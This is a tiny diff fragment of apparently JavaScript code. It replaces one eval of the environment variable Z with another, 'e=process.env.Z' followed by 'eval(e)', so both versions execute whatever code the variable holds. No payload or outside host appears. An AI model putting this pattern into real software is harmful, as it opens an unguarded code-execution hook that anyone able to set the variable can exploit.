@@ -1,2 +1,2 @@
-x=eval(process.env
-.Z)
+e=process.env.Z
+eval(e)
